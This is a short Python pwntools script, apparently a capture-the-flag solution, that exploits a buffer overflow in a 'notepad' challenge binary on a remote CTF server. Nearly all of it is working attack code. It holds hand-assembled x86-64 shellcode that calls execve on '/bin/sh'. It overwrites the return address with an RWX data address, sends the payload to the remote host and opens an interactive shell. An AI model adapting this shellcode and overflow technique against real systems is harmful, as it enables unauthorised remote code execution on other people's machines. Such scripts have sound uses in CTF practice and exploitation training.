#!/usr/bin/env python

from pwn import *

def jmp_adr( adr, ddNum ):
    jmp_op = '\xEB'
    dead_code = '\x90' * ddNum
    jmp_with_dead = jmp_op + adr + dead_code
    return jmp_with_dead

magic_str = 0x0068732f6e69622f

### 24 bytes 
payload = '\x50\x48\x31\xd2\x48\x31\xf6' + jmp_adr( '\x07', 7 ) + '\x48\x8D\x3C\x25\x30\x11\x60\x00' + jmp_adr( '\x06', 6 ) + '\xb0\x3b\x0f\x05'
data_rwx = 0x6010c0
main = 0x0000000000400912
### Total payload : 36 bytes ###

# r = process( './notepad' )
r = remote( 'ctf.adl.tw', 11003 )
# pause()
### 0x98 + ret
# 0x98 - 36 = 116
# 112 - 36 = 76
# 116 - 84 = 32
r.sendlineafter( 'Write some note:', payload + 'A'*76 + p64( magic_str ) + 'B'*32 + p64( data_rwx ) ) # 

r.interactive()
